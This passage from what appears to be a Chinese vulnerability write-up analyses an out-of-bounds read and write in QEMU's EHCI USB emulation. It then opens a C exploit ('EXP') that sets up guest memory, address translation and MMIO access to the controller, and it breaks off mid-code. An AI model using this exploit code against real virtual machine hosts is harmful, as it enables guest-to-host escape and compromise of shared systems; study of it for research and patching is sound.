class="meta">#<span class="keyword">define</span> QTD_TOKEN_CPAGE_MASK          0x00007000</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> QTD_TOKEN_CPAGE_SH            12</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> QTD_TOKEN_TBYTES_MASK         0x7fff0000</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> QTD_TOKEN_TBYTES_SH           16</span></span><br><span class="line">    cpage  = get_field(p-&gt;qtd.token, QTD_TOKEN_CPAGE);</span><br><span class="line">    bytes  = get_field(p-&gt;qtd.token, QTD_TOKEN_TBYTES);</span><br><span class="line">    offset = p-&gt;qtd.bufptr[<span class="number">0</span>] &amp; ~QTD_BUFPTR_MASK;</span><br><span class="line">    qemu_sglist_init(&amp;p-&gt;sgl, p-&gt;<span class="built_in">queue</span>-&gt;ehci-&gt;device, <span class="number">5</span>, p-&gt;<span class="built_in">queue</span>-&gt;ehci-&gt;as);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (bytes &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cpage &gt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;cpage out of range (%d)\n&quot;</span>, cpage);</span><br><span class="line">            qemu_sglist_destroy(&amp;p-&gt;sgl);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        page  = p-&gt;qtd.bufptr[cpage] &amp; QTD_BUFPTR_MASK;</span><br><span class="line">        page += offset;</span><br><span class="line">        plen  = bytes;</span><br><span class="line">        <span class="keyword">if</span> (plen &gt; <span class="number">4096</span> - offset) &#123;</span><br><span class="line">            plen = <span class="number">4096</span> - offset;</span><br><span class="line">            offset = <span class="number">0</span>;</span><br><span class="line">            cpage++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        qemu_sglist_add(&amp;p-&gt;sgl, page, plen);</span><br><span class="line">        bytes -= plen;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到<code>cpage</code>是一个类似于<code>index</code>的东西，<code>base</code>也就是基地址对应的<code>page</code>来自于<code>bufptr[cpage]</code>。<code>len</code>也就是<code>size</code>对应的<code>plen</code>来自于<code>bytes</code>，而<code>bytes</code>和<code>cpage</code>都是从<code>token</code>中提取出来的。而我们又可以通过<code>periodiclistbase</code>控制<code>list</code>和<code>entry</code>从而控制<code>qtd</code>结构体，也即是我们可以控制<code>bufptr</code>和<code>token</code>这两个成员变量。也就是我们可以控制<code>iov</code>结构体的所有内容。</p><p>其实我们看到进行读写即<code>do_token_in/out</code>的关键函数<code>use_packet_copy</code>函数就是对向<code>iov.iov</code>写入数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">usb_packet_copy</span><span class="params">(USBPacket *p, <span class="type">void</span> *ptr, <span class="type">size_t</span> bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    QEMUIOVector *iov = p-&gt;combined ? &amp;p-&gt;combined-&gt;iov : &amp;p-&gt;iov;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;actual_length &gt;= <span class="number">0</span>);</span><br><span class="line">    assert(p-&gt;actual_length + bytes &lt;= iov-&gt;size);</span><br><span class="line">    <span class="keyword">switch</span> (p-&gt;pid) &#123;</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_SETUP:</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_OUT:</span><br><span class="line">        iov_to_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_IN:</span><br><span class="line">        iov_from_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: invalid pid: %x\n&quot;</span>, __func__, p-&gt;pid);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;actual_length += bytes;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">iov_to_buf</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> iov_cnt,</span></span><br><span class="line"><span class="params">           <span class="type">size_t</span> offset, <span class="type">void</span> *buf, <span class="type">size_t</span> bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_constant_p(bytes) &amp;&amp; iov_cnt &amp;&amp;</span><br><span class="line">        offset &lt;= iov[<span class="number">0</span>].iov_len &amp;&amp; bytes &lt;= iov[<span class="number">0</span>].iov_len - offset) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, iov[<span class="number">0</span>].iov_base + offset, bytes);</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iov_to_buf_full(iov, iov_cnt, offset, buf, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">iov_from_buf</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">unsigned</span> <span class="type">int</span> iov_cnt,</span></span><br><span class="line"><span class="params">             <span class="type">size_t</span> offset, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_constant_p(bytes) &amp;&amp; iov_cnt &amp;&amp;</span><br><span class="line">        offset &lt;= iov[<span class="number">0</span>].iov_len &amp;&amp; bytes &lt;= iov[<span class="number">0</span>].iov_len - offset) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(iov[<span class="number">0</span>].iov_base + offset, buf, bytes);</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iov_from_buf_full(iov, iov_cnt, offset, buf, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到其最终是向<code>iov[0].iov_base</code>写入了数据。虽然在<code>usb_packet_copy</code>函数中写入的字节数是一个参数，但是我们看一下函数再调用中的参数的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line"><span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">  len = p-&gt;iov.size;</span><br><span class="line">&#125;</span><br><span class="line">usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br></pre></td></tr></table></figure><p>我们看到这里的<code>len</code>要么就是<code>setup_len</code>，要么就是<code>iov.size</code>。而<code>setup_len</code>是我们控制的，<code>iov.size</code>我们也可以进行控制，因此这里拷贝的长度和目标地址都是可控的。这也就是解释了为什么我们可以指定读取的目标地址和写入的源地址。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> <span class="title">USBDevice</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> <span class="title">USBEndpoint</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> nr;</span><br><span class="line">    <span class="type">uint8_t</span> pid;</span><br><span class="line">    <span class="type">uint8_t</span> type;</span><br><span class="line">    <span class="type">uint8_t</span> ifnum;</span><br><span class="line">    <span class="type">int</span> max_packet_size;</span><br><span class="line">    <span class="type">int</span> max_streams;</span><br><span class="line">    <span class="type">bool</span> pipeline;</span><br><span class="line">    <span class="type">bool</span> halted;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    USBEndpoint *fd;</span><br><span class="line">    USBEndpoint *bk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    <span class="type">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="type">int32_t</span> setup_state;</span><br><span class="line">    <span class="type">int32_t</span> setup_len;</span><br><span class="line">    <span class="type">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[<span class="number">15</span>];</span><br><span class="line">    USBEndpoint ep_out[<span class="number">15</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EHCIqh</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> next;                    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint characteristics */</span></span><br><span class="line">    <span class="type">uint32_t</span> epchar;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint capabilities */</span></span><br><span class="line">    <span class="type">uint32_t</span> epcap;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> current_qtd;             <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="type">uint32_t</span> next_qtd;                <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="type">uint32_t</span> altnext_qtd;         </span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> token;                   <span class="comment">/* Same as QTD token */</span></span><br><span class="line">    <span class="type">uint32_t</span> bufptr[<span class="number">5</span>];               <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line"></span><br><span class="line">&#125; EHCIqh;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EHCIqtd</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> next;                    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="type">uint32_t</span> altnext;                 <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="type">uint32_t</span> token;</span><br><span class="line">    <span class="type">uint32_t</span> bufptr[<span class="number">5</span>];               <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line">&#125; EHCIqtd;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *setup_buf;</span><br><span class="line"><span class="type">char</span> *data_buf;</span><br><span class="line"><span class="type">char</span> *data_bufoob;</span><br><span class="line"><span class="type">char</span> *first_leak_data;</span><br><span class="line"><span class="type">char</span> *second_leak_data;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">char</span> *dmabuf;</span><br><span class="line"><span class="type">uint32_t</span> *entry;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIqh</span> *<span class="title">qh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIqtd</span> * <span class="title">qtd</span>;</span></span><br><span class="line"><span class="type">uint64_t</span> device_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> func_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> port_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> port_ptr = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> data_buf_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> proc_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">virtuak_addr_to_physical_addr</span><span class="params">(<span class="type">void</span> *addr)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = (value &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr + <span class="number">4</span>)) = (value &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> value1 = *((<span class="type">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">    <span class="type">uint32_t</span> value2 = *((<span class="type">uint32_t</span> *)(mmio_mem + addr + <span class="number">4</span>));</span><br><span class="line">    <span class="type">uint64_t</span> value =  ((<span class="type">uint64_t</span>)value2 &lt;&lt; <span class="number">32</span>) + value1;</span><br><span class="line">    <span class="comment">// return *((uint64_t*)(mmio_mem + addr));</span></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">echi_reset</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,<span class="number">1</span>&lt;&lt;<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_usbcmd</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    echi_reset();</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,(<span class="number">1</span>&lt;&lt;<span class="number">0</span>)|(<span class="number">1</span>&lt;&lt;<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_portsc</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x64</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x65</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x65</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x66</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span 